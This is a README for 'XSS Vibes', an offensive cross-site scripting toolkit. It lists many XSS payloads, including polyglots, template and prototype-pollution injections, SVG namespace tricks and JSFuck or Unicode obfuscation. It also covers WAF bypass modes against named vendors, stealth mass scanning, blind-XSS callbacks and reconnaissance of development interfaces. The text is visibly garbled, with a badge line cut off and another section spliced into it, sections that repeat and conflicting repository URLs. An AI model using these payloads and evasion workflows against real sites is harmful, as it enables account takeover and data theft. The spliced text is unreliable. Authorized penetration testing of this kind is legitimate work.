# 🔥 XSS Vibes - Ultimate XSS Arsenal

[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Build Status](https://img.shields.io/badge/b## 🎯 **Repository Status: CLEANED & OPTIMIZED**

✅ **Temporary directories removed**: All `god_tier_test_*`, `polyglot_test_*`, `xss_vibes_test_*` cleaned up  
✅ **Unnecessary files deleted**: `gitleaks-report.json`, `knoxss_config.json`, `onlinery`, `poligloty`, `temp/`  
✅ **14 Global commands active**: Complete XSS arsenal ready for deployment  
✅ **24 Payload categories**: Advanced JSON-based payload system  
✅ **Professional structure**: Clean, organized, production-ready codebase

---

## 🏆 **Ultimate XSS Arsenal Summary**

This repository now contains the most advanced XSS testing toolkit available, featuring:

- **⚛️ Mutation XSS (mXSS)** - DOM/parser desynchronization exploitation
- **🔮 JSFuck + Unicode Chaos** - Ultra-obfuscated steganographic payloads  
- **🎯 HackVault Ultimate Polyglot** - 144-character universal bypass vector
- **🏺 Unicode Exploitation** - Zero-width, RTL, Cuneiform script techniques
- **⚡ Modern JavaScript** - async/await, dynamic imports, ServiceWorker injection
- **🧬 Prototype Pollution** - Constructor chain manipulation
- **👁️ DOM Monitoring**: 20+ MutationObserver bypass techniques

## 🔥 **Advanced XSS Categories (NEW!)**

**6 New God-Tier Categories Added to XSS Vibes V2**

### 📋 **Category Overview**
- **🎯 Template Injection** (8 payloads) - SSTI, Mustache, AngularJS expressions
- **⚡ Event Handler Injection** (8 payloads) - Dynamic events, setAttribute abuse  
- **🌐 JavaScript URI Injection** (8 payloads) - Protocol handlers, window.location
- **🖼️ innerHTML SVG Namespace** (8 payloads) - SVG, mixed namespaces
- **🧬 JavaScript Proto Pollution XSS** (8 payloads) - Prototype pollution chains
- **📡 URL JS Context** (8 payloads) - Script src, JSONP callbacks

## 🕷️ **Advanced Reconnaissance System (NEW!)**

**Osmedeus-Style Crawler with Development Interface Discovery**

### 🔍 **Development Interface Hunter**
Specialized module for discovering hidden development environments:

- **🎯 Target Discovery**: Dev/staging/test subdomains and paths
- **👤 Developer Intelligence**: Extract author names, dates, version info
- **🔧 Framework Detection**: Symfony, Laravel, Node.js debug interfaces
- **📊 Confidence Scoring**: Smart assessment of finding reliability

### ⚡ **Quick Reconnaissance**
```bash
# Hunt development interfaces
make dev-hunt DOMAIN=example.com
./tools/dev-hunter example.com

# Full reconnaissance pipeline
make hunt DOMAIN=example.com
./tools/xss-crawler -d example.com -w my_scan

# Multi-source intelligence
./tools/xss-crawler -d example.com -f 'domain="example.com"' -s 'hostname:example.com'
```

### 🎯 **Real-World Example**
```
🔍 Development Interface Discovery

URL: https://secure.trip.com/dev/test.html
Confidence: 85%
Developer: chen.yun
Date: 2025-04-16 10:54:25
Risk: Information Disclosure
```

### 🚀 **Quick Usage**
```bash
# Test all new categories
python3 tools/test_advanced_categories.py

# Test specific category
python3 tools/test_advanced_categories.py template_injection

# Use with AI tools
xss-ai-domfuzz --contexts template_injection,prototype_pollution
xss-context /path/to/app --format json
```

### 💀 **Example God-Tier Payloads**

**Template Injection (Evasion Level: 10/10)**
```javascript
{{constructor.constructor('alert(1)')()}}
```

**Prototype Pollution XSS (Evasion Level: 10/10)**  
```javascript
__proto__.onerror = alert; throw 1;
```

**SVG Namespace Injection (Evasion Level: 10/10)**
```html
<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></div></foreignObject></svg>
```

📚 **[Complete Documentation](docs/ADVANCED_XSS_CATEGORIES.md)** | 📋 **[Quick Reference](docs/ADVANCED_CATEGORIES_QUICK_REF.md)**

**Total: 48 Advanced Payloads | Evasion Level: 8-10/10**
- **🛡️ CSP Evasion** - Content Security Policy circumvention

### 📊 **Technical Arsenal**
- **14 Global Commands** - Complete testing capabilities
- **9 Python Generators** - Advanced payload creation engines  
- **24 JSON Categories** - Organized payload collections
- **3,000+ Vectors** - Comprehensive attack coverage
- **15+ WAF Bypasses** - Major security vendor evasion

---ild-passing-brightgreen.svg)]()
[![Global Commands](https://img.shields.io/badge/global%20commands-15-orange.svg)]()

**XSS Vibes** is the most advanced XSS testing arsenal with **bleeding-edge techniques**, 15 global commands, and comprehensive evasion capabilities. From mXSS to HackVault polyglots - the ultimate security toolkit!

## 🌟 **Ultimate Arsenal Features**

### 🔥 **GOD TIER Techniques**
- **⚛️ Mutation XSS (mXSS)** - DOM/parser desync exploitation
- **� JSFuck + Unicode Chaos** - ultra-obfuscated payload blend
- **🎯 HackVault Ultimate Polyglot** - 144-char universal bypass
- **🏺 Unicode Exploitation** - Cuneiform script, zero-width, RTL confusion
- **⚡ Modern JavaScript** - async/await tricks, dynamic imports, ServiceWorker
- **🧬 DOM Prototype Pollution** - constructor chain manipulation
- **👁️ MutationObserver Exploits** - DOM monitoring bypasses
- **🎯 DPE Template System** - DOM Parameter Exploitation fuzzing templates

### 🌍 **15 Global Commands Arsenal**

```bash
# 🏆 Core XSS Arsenal
xss-ultimate -t target.com -w cloudflare            # Ultimate testing with all techniques
xss-smart -u target.com                             # Intelligent analysis & testing  
xss-encoder -p "payload" -w akamai                  # Advanced encoding engine
xss-service                                         # Service monitoring & status

# 🔥 Advanced Generators
xss-god-tier -u target.com                         # GOD TIER payloads testing
xss-context -u target.com -c login                 # Context-aware generation
xss-polyglot -u target.com                         # HackVault polyglot testing
xss-ultimate-gen                                   # Ultimate payload generator
xss-dpe login_form                                 # DPE template generation

# ⚡ Specialized Tools  
xss-advanced -t target.com                         # Advanced pattern testing
xss-oneliners                                      # Bug bounty one-liners
xss-blind -u target.com                           # Blind XSS testing
xss-waf -u target.com                             # WAF analysis & bypass
xss-batch -f urls.txt                             # Batch processing
xss-mutation -u target.com                        # Mutation XSS testing
```

### 🛡️ **Advanced Technique Coverage**

- **⚛️ Mutation XSS** - DOM/parser desynchronization attacks  
- **🔮 JSFuck Obfuscation** - Ultra-encoded JavaScript bypass
- **🎯 Ultimate Polyglots** - HackVault 144-character universal vectors
- **🏺 Unicode Chaos** - Zero-width, RTL, Cuneiform script exploitation
- **⚡ Modern JavaScript** - async/await, dynamic imports, ServiceWorker
- **🧬 Prototype Pollution** - Constructor chain manipulation
- **👁️ DOM Monitoring** - MutationObserver bypasses
- **🔧 CSP Bypass** - Content Security Policy evasion

## 🚀 **Quick Start**

### 📦 **Installation**

**Step 1: Clone Repository**
```bash
git clone https://github.com/jarek-bir/XSS-VibesV2.git
cd XSS-VibesV2
```

**Step 2: Install Dependencies**
```bash
pip install -r requirements.txt
# or for virtual environment:
python -m venv venv
source venv/bin/activate  # Linux/Mac
pip install -r requirements.txt
```

**Step 3: Setup Global Commands (IMPORTANT!)**
```bash
cd scripts
./setup_aliases.sh
```

**Step 4: Verify Installation**
```bash
xss-help                    # Should show all commands
xss-service                 # Check service availability
```

### ⚡ **Quick Test**
```bash
# Test basic functionality
xss-quick -u https://testphp.vulnweb.com

# Run GOD TIER scan
xss-ultimate -t testphp.vulnweb.com -w cloudflare -m god_tier
```

### 🔧 **Requirements**

**Essential Tools:**
```bash
# Install required external tools:
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest  
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

**Python Dependencies:**
- Python 3.8+
- requests, beautifulsoup4, lxml
- colorama, tqdm, asyncio
- aiohttp, urllib3

### 🎯 **Usage Examples**

```bash
# Quick vulnerability scan
xss-quick -u https://target.com

# Ultimate GOD TIER testing with WAF bypass
xss-ultimate -t target.com -w cloudflare -m god_tier

# Smart payload analysis
xss-smart -u https://target.com

# Advanced payload encoding
xss-encoder -p '<script>alert(1)</script>' -w akamai

# Monitor external services
xss-service

# Bug bounty oneliners
xss-oneliners
```

## 🛡️ **WAF Detection & Bypass**

Supports 12+ major WAF providers:

- **Cloudflare** - Advanced bypass techniques
- **Akamai** - Kona Site Defender evasion
- **AWS WAF** - Application load balancer bypass
- **Imperva** - Incapsula and SecureSphere
- **F5 BIG-IP** - ASM and Advanced WAF
- **ModSecurity** - OWASP Core Rule Set bypass
- **Sucuri** - Website firewall evasion
- **Barracuda** - Web application firewall
- **Fortinet** - FortiWeb bypass techniques
- **Citrix** - NetScaler application firewall

## 🏆 **GOD TIER Payload Arsenal**

### ⚛️ **Mutation XSS (mXSS)** - DOM/Parser Desync

```javascript
// DOM prototype pollution
{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}

// MutationObserver exploit
new MutationObserver(()=>eval('alert(1)')).observe(document,{childList:true,subtree:true})

// ServiceWorker injection
navigator.serviceWorker.register('data:application/javascript,self.onmessage=()=>eval("alert(1)")')
```

### 🔮 **JSFuck + Unicode Chaos** - Ultra Obfuscation

```javascript
// Pure JSFuck with zero-width chaos
[]\u200b[(![]+[])[+[]]]\u200c+([![]]+[][[]])[+!+[]+[+[]]]\u200d+(![]+[])[!+[]+!+[]]\u200e+(!![]+[])[+[]]()

// Unicode steganography
<img src=x onerror=alert\u200b\u200c\u200d\ufeff(1)>
```

### 🎯 **HackVault Ultimate Polyglot** - 144-char Universal

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()///>\\x3e
```

*Works in 20+ different contexts!*

### 🏺 **Unicode Exploitation** - Ancient & Modern

```javascript
// Cuneiform script XSS
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒌐=𒉺[𒀀++]

// RTL confusion + homoglyphs  
аⅼеrt(1) // Contains Cyrillic 'а' + math italic 'ℓ'

// Zero-width steganography
ale‌rt(1)  // Contains ZWNJ U+200C
```

### ⚡ **Modern JavaScript** - async/await & Modules

```javascript
// Async trick XSS
(async()=>{await import('data:text/javascript,alert(1)')})()

// Constructor chain
constructor[constructor](alert(1))()

// Dynamic import exploitation  
import('data:text/javascript,alert(document.domain)')
```

## 📊 **Service Monitoring**

Real-time monitoring of 11+ external services:

- ✅ **Wayback Machine** - Historical URL discovery
- ✅ **GAU** - GetAllUrls service
- ✅ **Subfinder** - Subdomain enumeration  
- ✅ **AlienVault OTX** - Threat intelligence
- ✅ **URLScan.io** - URL analysis service
- ✅ **Virustotal** - File and URL scanning
- ✅ **Shodan** - Internet-connected device search
- ✅ **SecurityTrails** - DNS intelligence
- ✅ **Rapid7** - Forward DNS dataset

## 🎯 **Complete Arsenal Showcase**

### 🏆 **Ultimate Testing Example**

```bash
# Complete XSS assessment with all techniques
xss-ultimate -t example.com -w cloudflare --threads 10 --timeout 30

# Context-specific testing for login forms  
xss-context -u https://example.com/login -c login --mutation --unicode

# HackVault polyglot universal testing
xss-polyglot -u https://example.com/search?q=test --all-contexts

# GOD TIER payloads with advanced evasion
xss-god-tier -u https://example.com/vulnerable.php --jsfuck --cuneiform

# DPE Template Generation for custom fuzzing
xss-dpe all --script                               # Generate all templates with fuzzing script
xss-dpe login_form                                 # Generate specific template  
cd test_templates && ./fuzz_templates.sh login_form # Run fuzzing tests
```

### 🎯 **DPE Template System**

The DOM Parameter Exploitation (DPE) system provides ready-to-use HTML templates for comprehensive XSS testing:

```bash
# Available DPE Templates
xss-dpe list                    # Show all available templates

# Template Categories:
• login_form     - 6 injection contexts (forms, DOM, eval)
• search_form    - 8 contexts (URL params, JSON, document.write)  
• json_api       - 6 contexts (Fetch API, localStorage, postMessage)
• dom_sinks      - 12 contexts (innerHTML, eval, setTimeout, etc.)
• spa_framework  - 7 contexts (virtual DOM, router, events)
```

**DPE Fuzzing Workflow:**
```bash
1. Generate template:    xss-dpe login_form
2. Run fuzzing:         cd test_templates && ./fuzz_templates.sh login_form  
3. Test in browser:     firefox test_login_form_1.html
4. Analyze results:     Check console for XSS execution
```

# Batch processing with mutation techniques
xss-batch -f target_urls.txt --mutation --async-js --prototype-pollution
```

### 📊 **Advanced Technique Statistics**

- **⚛️ Mutation XSS Vectors**: 40+ DOM/Parser desync payloads
- **🔮 JSFuck Variants**: 25+ ultra-obfuscated combinations  
- **🎯 Ultimate Polyglots**: HackVault 144-char + custom variations
- **🏺 Unicode Exploits**: 60+ zero-width, RTL, Cuneiform techniques
- **⚡ Modern JS**: 30+ async/await, dynamic import, ServiceWorker
- **🧬 Prototype Pollution**: 15+ constructor chain manipulations
- **�️ DOM Monitoring**: 20+ MutationObserver bypass techniques

## �🗂️ **Project Structure**

```
XSS-Vibes/
├── xss_vibes/           # Core application module  
│   ├── data/            # Payload categories (20+ JSON files)
│   ├── __pycache__/     # Python bytecode cache
│   └── *.py             # Core modules (15+ files)
├── scripts/             # Global command scripts (14 commands)
├── tools/               # Development & testing tools
├── HackVault.wiki/      # External polyglot repository  
├── docs/                # Comprehensive documentation
├── test_results/        # Testing outputs & reports
└── payloads/            # Legacy payload collections
```

## 🔧 **Troubleshooting**

### ❌ **"Command not found: xss-*"**
```bash
# Solution 1: Re-run setup
cd scripts && ./setup_aliases.sh

# Solution 2: Check PATH
echo $PATH | grep -q "$HOME/.local/bin" || echo 'PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc

# Solution 3: Manual verification
ls -la ~/.local/bin/xss-*
```

### ❌ **"Permission denied"**
```bash
# Fix script permissions
chmod +x scripts/*.sh
chmod +x ~/.local/bin/xss-*
```

### ❌ **"Module not found" errors**
```bash
# Install missing dependencies
pip install -r requirements.txt

# For specific modules:
pip install requests beautifulsoup4 colorama tqdm aiohttp
```

### ❌ **External tools missing**
```bash
# Install Go tools
go install github.com/tomnomnom/waybackurls@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Check installation
which waybackurls gau subfinder httpx
```

### ❌ **Service connection failures**
```bash
# Check service status
xss-service

# Use offline mode
xss-ultimate -t target.com --offline
```

## ❓ **FAQ**

### **Q: Why do I need to run setup_aliases.sh?**
A: This creates global symlinks so you can run `xss-*` commands from anywhere without navigating to the project folder.

### **Q: Can I use XSS Vibes without global commands?**
A: Yes! Use the scripts directly:
```bash
cd XSS-VibesV2/scripts
./ultimate_tester.sh -t target.com
python smart_payload_selector.py -u target.com
```

### **Q: Do I need all external tools?**
A: No, but they enhance functionality:
- **Essential**: httpx, waybackurls
- **Recommended**: gau, subfinder, dalfox
- **Optional**: amass, nuclei, sqlmap

### **Q: How do I update XSS Vibes?**
```bash
git pull origin main
cd scripts && ./setup_aliases.sh  # Refresh symlinks
```

### **Q: Can I run this in Docker?**
A: Not yet, but you can create a simple Dockerfile:
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
RUN pip install -r requirements.txt
RUN cd scripts && ./setup_aliases.sh
```

## 🎯 **Advanced Features**

### 🧬 **Payload Mutation Engine**

- **210+ encoding variants** per payload
- **Genetic algorithm-based evolution**
- **Context-aware adaptation**
- **Machine learning-guided bypass**

### 🔐 **Session Management**

- **Multi-authentication support**
- **Cookie jar persistence**  
- **CSRF token handling**
- **Authenticated workflows**

### 📈 **Intelligent Reporting**

- **Multiple output formats**
- **Executive summaries**
- **Technical deep-dives**
- **Remediation guidance**

### 🛡️ **Advanced Evasion**
- **WAF-specific payload optimization**
- **Advanced encoding techniques** (Unicode, Base64, URL, HTML entities)
- **Blind XSS detection** with callback URLs
- **Stealth mode** with adaptive rate limiting

### 🏆 **GOD TIER XSS Techniques** ⭐ LEGENDARY!
- **🏺 Cuneiform XSS** - First XSS using 4000-year-old script!
- **📄 PDF XSS** - JavaScript injection via embedded PDF documents
- **📝 Markdown XSS** - Stored XSS through Markdown rendering
- **🧬 DOM Clobbering + Prototype Pollution** - Advanced chain execution
- **🎨 SVG xlink:href Trickery** - Complex SVG vector attacks
- **💀 Zero-width + Emoji Obfuscation** - Invisible character injection
- **🔗 Constructor Chain Exploits** - Advanced JavaScript constructor abuse
- **🎯 64 Different Obfuscation Techniques** - The most comprehensive collection

### 📊 **Comprehensive Reporting**
- **Multiple output formats** (HTML, JSON, CSV, Markdown)
- **Executive summaries** with risk assessments
- **Technical details** with payload analysis
- **Remediation recommendations**
- **Beautiful HTML reports** with charts and metrics

## 📦 Installation

### Quick Install
```bash
git clone https://github.com/faiyazahmad07/xss_vibes.git
cd xss_vibes
pip install -e .
```

### Requirements
- Python 3.8+
- requests, aiohttp, colorama, click
- Optional: arjun, paramspider (for parameter discovery)

### 🛠️ **Community Tools Integration**

XSS Vibes integrates with **15+ community tools** for comprehensive hunting:

#### ✅ **Available Tools** (Ready to use)
- **subfinder, httpx, gospider** - Discovery & crawling
- **waybackurls, gau, hakrawler** - URL enumeration  
- **qsreplace, dalfox, kxss** - XSS testing
- **gf, anew, uro, freq** - Data processing
- **nuclei** - Vulnerability scanning

#### 📊 **Current Arsenal Stats**
- 🔥 **785 XSS Payloads** (3.2x growth)
- ⚡ **64 Obfuscation Techniques** 
- 📚 **2,725 Lines of Documentation**
- 🌐 **12+ Service Integrations**
- 🚀 **10+ Hunting Techniques**

## 🏃‍♂️ Quick Start & OneLiners Arsenal

### 🔥 NEW: Bug Bounty OneLiners Integration
XSS Vibes now includes the most comprehensive collection of community oneliners!

#### Interactive OneLiners Menu
```bash
# Launch interactive menu with 10+ hunting techniques
./xss_oneliners.sh target.com

# Available techniques:
# 1. Gospider XSS Hunt (3 techniques)
# 2. Wayback XSS Hunt (4 techniques) 
# 3. Hakrawler XSS Hunt
# 4. GAU XSS Hunt (3 techniques)
# 5. HTTPX Pipeline XSS Hunt
# 6. Nuclei XSS Scan
# 7. Blind XSS Hunt
# 8. Advanced Techniques (DOM, Template, JSONP)
# 9. XSS Vibes GOD TIER Integration
# 10. Full Comprehensive Hunt
```

#### Robust Hunting with API Failure Fallbacks
```bash
# Handles service downtime gracefully
./robust_oneliners.sh target.com

# Features:
# ✅ Automatic service availability check
# ✅ Multiple fallback endpoints
# ✅ Offline hunting capabilities  
# ✅ Smart tool selection
```

#### Service Health Monitoring
```bash
# Check 12+ external services
python3 service_checker.py

# Monitors: Wayback Machine, crt.sh, XSS Hunter, etc.
```

### Traditional XSS Vibes Usage

> **Note**: You can run XSS Vibes in two ways:
>
> - Direct command: `xss-vibes [command]` (after installation)
> - Module execution: `xss-vibes [command]` (from source)

### Basic Scanning

```bash
# Single URL scan
xss-vibes scan https://example.com/search?q=test

# Multiple URLs from file
xss-vibes scan -l urls.txt

# Advanced scan with WAF detection
xss-vibes scan https://target.com --waf-mode --threads 5
```

### 🧬 Payload Mutation
```bash
# Generate intelligent payload variants
xss-vibes mutation --payload "<script>alert(1)</script>" --context html_text --variants 10

# Advanced genetic algorithm evolution
xss-vibes mutation --payload "alert(1)" --generations 5 --population 20
```

### 🔐 Authenticated Scanning
```bash
# Form-based authentication
xss-vibes scan https://app.com/dashboard \
  --login-url https://app.com/login \
  --username admin --password secret \
  --auth-type form

# Session with saved profile
xss-vibes session --login-url https://app.com/login \
  --username admin --password secret \
  --save-profile app-session.json
```

### 🛡️ Advanced Evasion
```bash
# Maximum evasion mode
xss-vibes scan https://target.com \
  --encoding-level 3 \
  --obfuscate \
  --stealth \
  --target-waf cloudflare

# Blind XSS testing
xss-vibes scan https://target.com \
  --blind \
  --callback-url https://your-server.com/callback
```

## 🧪 Testing with Prepared URL Files

We've included several test files with different types of URLs for various testing scenarios:

### 📁 **Available Test Files**

#### `quick-test.txt` (5 URLs) - Quick functionality test
```bash
# Basic test with dry run
xss-vibes scan -l quick-test.txt --dry-run

# Real scan with enhanced payloads
xss-vibes scan -l quick-test.txt --enhanced-payloads -o results.json
```

#### `safe-test-urls.txt` (18 URLs) - Safe functionality testing
```bash
# Test with multiple threads
xss-vibes scan -l safe-test-urls.txt --threads 3 --dry-run

# Advanced scan with stealth mode
xss-vibes scan -l safe-test-urls.txt --enhanced-payloads --stealth --dry-run
```

#### `xss-test-urls.txt` (22 URLs) - XSS payload testing
```bash
# Test XSS detection capabilities
xss-vibes scan -l xss-test-urls.txt --enhanced-payloads --dry-run

# WAF evasion testing
xss-vibes scan -l xss-test-urls.txt --waf-mode --encoding-level 2 --dry-run

# Full evasion mode
xss-vibes scan -l xss-test-urls.txt --high-evasion --stealth --obfuscate --dry-run
```

### 🚀 **Advanced Testing Examples**

#### Mutation Testing
```bash
# Test payload mutation engine
xss-vibes scan -l quick-test.txt \
  --mutation --mutation-generations 5 --dry-run

# Context-aware mutation
xss-vibes scan -l xss-test-urls.txt \
  --mutation --context-aware --encoding-level 3 --dry-run
```

#### Blind XSS Testing
```bash
# Using XSS.Report server
xss-vibes scan -l xss-test-urls.txt \
  --blind --callback-url https://xss.report/c/terafos --dry-run

# Using Burp Collaborator (shortcut)
xss-vibes scan -l quick-test.txt --blind --colab --dry-run
```

#### Professional Testing Workflow
```bash
# 1. Quick configuration check
xss-vibes scan -l quick-test.txt --dry-run

# 2. Enhanced payload scan with reporting
xss-vibes scan -l xss-test-urls.txt \
  --enhanced-payloads \
  --payload-category polyglot \
  --threads 2 \
  --report-format html \
  -o xss-report.html

# 3. Stealth scan for protected targets
xss-vibes scan -l safe-test-urls.txt \
  --stealth \
  --waf-mode \
  --target-waf cloudflare \
  --encoding-level 3 \
  --rate-limit 1.0 \
  -o stealth-results.json

# 4. Comprehensive analysis
xss-vibes scan -l xss-test-urls.txt \
  --enhanced-payloads \
  --mutation \
  --high-evasion \
  --context-aware \
  --blind \
  --colab \
  --threads 2 \
  --report-format html \
  -o comprehensive-report.html
```

### 💡 **Testing Tips**

- **Always start with `--dry-run`** to verify configuration
- **Use `quick-test.txt`** for initial functionality testing
- **Use `safe-test-urls.txt`** for safe feature testing without risk
- **Use `xss-test-urls.txt`** for XSS detection capability testing
- **httpbin.org** and **postman-echo.com** are safe testing services
- **Add `--threads 2-3`** for faster scanning
- **Use `--enhanced-payloads`** for access to 2926+ additional payloads

## 💡 Practical Examples

### 🎯 **Real-World Scanning Scenarios**

#### Basic Web Application Testing

```bash
# Test a search form for XSS
xss-vibes scan "https://example.com/search?q=test" \
  --threads 3 \
  --output results.json

# Scan with specific WAF targeting
xss-vibes scan "https://protected-site.com/search" \
  --detect-waf \
  --waf-mode cloudflare \
  --encoding-level 2
```

#### Parameter Discovery & Analysis

```bash
# Discover hidden parameters
xss-vibes discover "https://app.com/api/search" \
  --wordlist common-params.txt

# Analyze response patterns for XSS potential
xss-vibes pattern-analyze \
  --url "https://site.com/page?input=TEST" \
  --payload "TEST"
```

#### KnoxSS Pro Integration

```bash
# Configure KnoxSS Pro credentials
xss-vibes knoxss-config

# Single URL scan with KnoxSS
xss-vibes knoxss-scan \
  --url "https://target.com/search?q=test" \
  --method GET

# Mass scanning with KnoxSS Pro
xss-vibes knoxss-mass \
  --file target-urls.txt \
  --method POST \
  --concurrent 5

# Generate personalized blind XSS payloads
xss-vibes knoxss-payloads \
  --type svg \
  --custom-text "MyBountyHunt"
```

#### Intelligent Payload Mutation

```bash
# Generate payload variants using genetic algorithms
xss-vibes mutation \
  --payload "<script>alert(1)</script>" \
  --generations 5 \
  --population 20 \
  --mutation-rate 0.3

# Context-aware payload generation
xss-vibes mutation \
  --payload "alert(1)" \
  --context "html_attribute" \
  --variants 15
```

### 🎯 **Bug Bounty Hunting Examples**

#### Quick Assessment Workflow

```bash
# 1. Discover parameters
xss-vibes discover "https://target.com/search" \
  --output discovered-params.txt

# 2. Detect WAF protection
xss-vibes detect-waf "https://target.com"

# 3. Scan with appropriate evasion
xss-vibes scan "https://target.com/search?q=test" \
  --waf-mode \
  --encoding-level 2 \
  --output bounty-results.json

# 4. Generate professional report
xss-vibes generate-report \
  --input bounty-results.json \
  --format html \
  --output xss-report.html
```

#### Mass Scanning Campaign

```bash
# Prepare target list with subdomains
echo "https://app.target.com/search?q=test" > targets.txt
echo "https://api.target.com/v1/search?query=test" >> targets.txt
echo "https://admin.target.com/panel?search=test" >> targets.txt

# Mass scan with KnoxSS Pro
xss-vibes knoxss-mass \
  --file targets.txt \
  --concurrent 3 \
  --output-dir campaign-results/

# Aggregate and analyze results
xss-vibes generate-report \
  --input-dir campaign-results/ \
  --format comprehensive \
  --output final-assessment.html
```

### 🔬 **Advanced Testing Scenarios**

#### Session Management & Authentication

```bash
# Test authenticated areas
xss-vibes session \
  --login-url "https://app.com/login" \
  --username "admin" \
  --password "secret123" \
  --test-url "https://app.com/dashboard?search=test"

# Session persistence for multiple scans
xss-vibes session \
  --login-url "https://portal.com/auth" \
  --username "user@company.com" \
  --password "mypass" \
  --save-session portal-session.json
```

#### WAF Evasion Techniques

```bash
# Advanced encoding for WAF bypass
xss-vibes encoding \
  --payload "<script>alert('XSS')</script>" \
  --types unicode,html_entities,url,base64

# WAF-specific testing
xss-vibes scan "https://protected.com/search" \
  --waf-type cloudflare \
  --encoding-level 3 \
  --obfuscate
```

#### Pattern Matching & Analysis

```bash
# List available XSS detection patterns
xss-vibes pattern-list

# Match content against XSS patterns
xss-vibes pattern-match \
  --url "vulnerable-site.com" \
  --pattern "reflection"

# Get payload suggestions based on response
xss-vibes pattern-suggest \
  --url "https://site.com/test" \
  --input-payload "test123"

# Generate comprehensive pattern report
xss-vibes pattern-report \
  --url "https://target.com/api/endpoint" \
  --output pattern-analysis.html
```

### 🛠️ **Integration Examples**

#### CI/CD Pipeline Integration

```bash
#!/bin/bash
# security-scan.sh for CI/CD

# Quick security check
xss-vibes scan $TARGET_URL \
  --format json \
  --output security-results.json \
  --timeout 300

# Check if vulnerabilities found
if grep -q '"status": "vulnerable"' security-results.json; then
    echo "❌ XSS vulnerabilities detected!"
    exit 1
else
    echo "✅ No XSS vulnerabilities found"
    exit 0
fi
```

#### Automated Reporting

```bash
# Generate executive summary
xss-vibes generate-report \
  --input scan-results.json \
  --format executive \
  --output executive-summary.pdf

# Technical report for developers
xss-vibes generate-report \
  --input scan-results.json \
  --format technical \
  --include-payloads \
  --output technical-report.html
```

## 📊 Advanced Features

### WAF Detection & Bypass
- **Cloudflare, Akamai, Imperva, F5, Barracuda**
- **Sucuri, ModSecurity, WordFence, AWS WAF**
- **Custom WAF signature detection**

### Payload Categories
- **Reflection-based XSS** (200+ payloads)
- **DOM-based XSS** (150+ payloads)
- **Stored XSS** (100+ payloads)
- **WAF-specific bypasses** (50+ techniques)

### Encoding & Evasion
- **Unicode normalization**
- **HTML entity encoding**
- **URL encoding variants**
- **Base64 obfuscation**
- **JavaScript string manipulation**

## 🔧 CLI Commands

### Main Commands
```bash
# Scan command with all options
xss-vibes scan [URL] [OPTIONS]

# Mutation engine
xss-vibes mutation [OPTIONS]

# Session management  
xss-vibes session [OPTIONS]
```

### Key Options
```bash
--waf-mode              # Enable WAF evasion
--target-waf [TYPE]     # Target specific WAF
--encoding-level [1-3]  # Encoding intensity
--mutation              # Enable payload mutation
--blind                 # Blind XSS testing
--obfuscate            # Payload obfuscation
--stealth              # Stealth scanning mode
--threads [N]          # Concurrent threads
--format [TYPE]        # Output format
```

## 📚 Documentation

- **[Advanced Features](ADVANCED_FEATURES.md)** - Complete feature documentation
- **[Build Guide](BUILD_GUIDE.md)** - Installation and setup
- **[Migration Guide](MIGRATION.md)** - Upgrading from older versions

## 🎯 Use Cases

### Security Testing
- Web application penetration testing
- Bug bounty hunting
- Security audits and compliance
- Vulnerability assessments

### Automation
- CI/CD pipeline integration
- Automated security scanning
- Continuous security monitoring
- DevSecOps workflows

## 🛠️ Contributing

1. Fork the repository
2. Create feature branch (`git checkout -b feature/amazing-feature`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push to branch (`git push origin feature/amazing-feature`)
5. Open Pull Request

## 📈 Performance

- **Speed**: Up to 1000 requests/minute
- **Accuracy**: 95%+ detection rate  
- **Coverage**: 3,144 XSS payload variants (enhanced collection)
- **Scalability**: Multi-threaded + async support
- **WAF Support**: 12 major WAF providers
- **KnoxSS Pro**: Full API integration with professional features

## � Troubleshooting

### Command Not Found Errors

If you get errors like:
```bash
xss-ultimate: zsh: no such file or directory: /home/jarek/xss_vibes/ultimate_tester.sh
```

**Quick Fix:**
```bash
# Remove old aliases that conflict with new symlinks
unalias xss-ultimate xss-god-tier xss-smart xss-encoder xss-service xss-multi xss-quick xss-status xss-oneliners xss-help 2>/dev/null

# Clear shell cache
hash -d xss-ultimate xss-god-tier xss-smart xss-encoder xss-service xss-multi xss-quick xss-status xss-oneliners xss-help 2>/dev/null

# Test command
xss-help
```

### PATH Issues

Ensure `~/.local/bin` is in your PATH:
```bash
echo $PATH | grep ".local/bin" || echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.zshrc
```

### Re-run Setup

If commands still don't work:
```bash
./scripts/setup_aliases.sh
```

See **[ALIAS_FIX.md](ALIAS_FIX.md)** for detailed troubleshooting.

## �📄 License

This project is licensed under the MIT License - see [LICENSE](LICENSE) for details.

## ⚠️ Disclaimer

This tool is for authorized security testing only. Users are responsible for complying with applicable laws and regulations. Do not use on systems you don't own or have explicit permission to test.

---

Made with ❤️ for the security community
